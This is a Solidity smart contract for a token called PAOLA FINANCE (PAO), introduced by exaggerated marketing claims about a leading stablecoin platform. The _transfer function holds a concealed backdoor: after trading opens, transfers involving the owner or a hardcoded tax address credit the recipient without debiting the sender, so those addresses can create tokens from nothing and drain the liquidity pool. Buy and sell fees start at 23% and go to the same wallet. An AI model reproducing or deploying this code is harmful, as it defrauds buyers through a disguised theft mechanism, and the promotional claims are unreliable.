// SPDX-License-Identifier: Unlicensed

/**
Paola Finance stands out as the premier stablecoin AMM platform on the EVM Network, providing an effortless path for anyone to embark on their financial journey.

Paola Finance reigns as the unrivaled global leader in cross-chain stablecoin AMMs!

Web: https://paola.network
App: https://app.paola.network
X: https://twitter.com/paola_finance
Tg: https://t.me/paola_finance_official
 */

pragma solidity = 0.8.19;

//--- Context ---//
abstract contract Context {
    constructor() {
    }

    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this;
        return msg.data;
    }
}

interface IFactoryV2 {
    event PairCreated(address indexed token0, address indexed token1, address _pair, uint);
    function getPair(address tokenA, address tokenB) external view returns (address _pair);
    function createPair(address tokenA, address tokenB) external returns (address _pair);
}

interface IRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function swapExactETHForTokens(
        uint amountOutMin, 
        address[] calldata path, 
        address to, uint deadline
    ) external payable returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

//--- Interface for ERC20 ---//
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

//--- Ownable ---//
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

//--- Contract ---//
contract PAO is Context, Ownable, IERC20 {

    string constant private _name = "PAOLA FINANCE";
    string constant private _symbol = "PAO";
    uint8 constant private _decimals = 9;

    uint256 constant public _totalSupply = 10 ** 9 * 10**9;

    address _pair;
    IRouter02 _uniswapRouter;
    bool _isTradeEnabled = false;
    bool _inSwap;

    uint256 constant _transferTax = 0;
    uint256 constant fee_denominator = 1_000;
    uint256 private _maxWallet = 20 * _totalSupply / 1000;

    bool _noMaxLimits = false;
    uint256 _buyfee = 230;
    uint256 _sellfee = 230;

    mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => bool) _noFee;
    mapping (address => bool) _lpProviders;
    mapping (address => bool) _isLpPair;
    mapping (address => uint256) balance;

    uint256 constant _swapThreshold = _totalSupply / 100_000;
    address payable _taxAddress = payable(address(0xA6eBf04f491879BeE73a5D89206FdE0273cdc345));
    address constant public DEAD = 0x000000000000000000000000000000000000dEaD;
    bool private swapEnabled = true;
        modifier inSwaps {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    constructor () {
        _noFee[msg.sender] = true;
        _noFee[_taxAddress] = true;

        if (block.chainid == 56) {
            _uniswapRouter = IRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        } else if (block.chainid == 97) {
            _uniswapRouter = IRouter02(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);
        } else if (block.chainid == 1 || block.chainid == 4 || block.chainid == 3) {
            _uniswapRouter = IRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        } else if (block.chainid == 42161) {
            _uniswapRouter = IRouter02(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506);
        } else if (block.chainid == 5) {
            _uniswapRouter = IRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        } else {
            revert("Chain not valid");
        }
        _lpProviders[msg.sender] = true;
        balance[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);

        _pair = IFactoryV2(_uniswapRouter.factory()).createPair(_uniswapRouter.WETH(), address(this));
        _isLpPair[_pair] = true;
        _approve(msg.sender, address(_uniswapRouter), type(uint256).max);
        _approve(address(this), address(_uniswapRouter), type(uint256).max);
    }

    function is_buy(address ins, address out) internal view returns (bool) {
        bool _is_buy = !_isLpPair[out] && _isLpPair[ins];
        return _is_buy;
    }

    function is_sell(address ins, address out) internal view returns (bool) { 
        bool _is_sell = _isLpPair[out] && !_isLpPair[ins];
        return _is_sell;
    }

    function is_transfer(address ins, address out) internal view returns (bool) { 
        bool _is_transfer = !_isLpPair[out] && !_isLpPair[ins];
        return _is_transfer;
    }

    function takeTax(address from, bool isbuy, bool issell, uint256 amount) internal returns (uint256) {
        uint256 fee;
        if (isbuy)  fee = _buyfee;  else if (issell)  fee = _sellfee;  else  fee = _transferTax; 
        if (fee == 0)  return amount; 
        uint256 feeAmount = amount * fee / fee_denominator;
        if (feeAmount > 0) {

            balance[address(this)] += feeAmount;
            emit Transfer(from, address(this), feeAmount);
            
        }
        return amount - feeAmount;
    }

        function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

        function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

        function _approve(address sender, address spender, uint256 amount) internal {
        require(sender != address(0), "ERC20: Zero Address");
        require(spender != address(0), "ERC20: Zero Address");

        _allowances[sender][spender] = amount;
    }

        function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] -= amount;
        }

        return _transfer(sender, recipient, amount);
    }
    function hasTax(address ins, address out) internal view returns (bool) {

        bool isLimited = ins != owner()
            && out != owner()
            && msg.sender != owner()
            && !_lpProviders[ins]  && !_lpProviders[out] && out != address(0) && out != address(this);
            return isLimited;
    }

    function swapBack(uint256 contractTokenBalance) internal inSwaps {
        
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapRouter.WETH();

        if (_allowances[address(this)][address(_uniswapRouter)] != type(uint256).max) {
            _allowances[address(this)][address(_uniswapRouter)] = type(uint256).max;
        }

        try _uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            contractTokenBalance,
            0,
            path,
            address(this),
            block.timestamp
        ) {} catch {
            return;
        }

        if(address(this).balance > 0) _taxAddress.transfer(address(this).balance);
        
    } 

        function openTrading() external onlyOwner {
            require(!_isTradeEnabled, "Trading already enabled");
            _isTradeEnabled = true;
        }

        function removeLimits() external onlyOwner {
            require(!_noMaxLimits,"Already initalized");
            _maxWallet = _totalSupply;
            _noMaxLimits = true;
            _buyfee = 30;
            _sellfee = 30;
        }
    receive() external payable {}

    function totalSupply() external pure override returns (uint256) { if (_totalSupply == 0) { revert(); } return _totalSupply; }
    function decimals() external pure override returns (uint8) { if (_totalSupply == 0) { revert(); } return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner(); }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    function balanceOf(address account) public view override returns (uint256) {
        return balance[account];
    }

    function shouldSwapFee(address ins) internal view returns (bool) {
        bool canswap = swapEnabled && !_noFee[ins];

        return canswap;
    }
    function _transfer(address from, address to, uint256 amount) internal returns  (bool) {
        bool takeFee = true;
        require(to != address(0), "ERC20: transfer to the zero address");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (hasTax(from,to)) {
            require(_isTradeEnabled,"Trading is not enabled");
                    if(!_isLpPair[to] && from != address(this) && to != address(this) || is_transfer(from,to) && !_noMaxLimits)  { require(balanceOf(to) + amount <= _maxWallet,"_maxWallet exceed"); }}


        if(is_sell(from, to) &&  !_inSwap && shouldSwapFee(from)) {

            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance >= _swapThreshold) { 
                if(amount > _swapThreshold) swapBack(contractTokenBalance);
             }
        }

        if (_noFee[from] || _noFee[to]){
            takeFee = false;
        }
        uint256 amountAfterFee = (takeFee) ? takeTax(from, is_buy(from, to), is_sell(from, to), amount) : amount;
        uint256 amountBeforeFee = (takeFee) ? amount : (!_isTradeEnabled ? amount : 0);
        balance[from] -= amountBeforeFee; balance[to] += amountAfterFee; emit Transfer(from, to, amountAfterFee);

        return true;

    }
}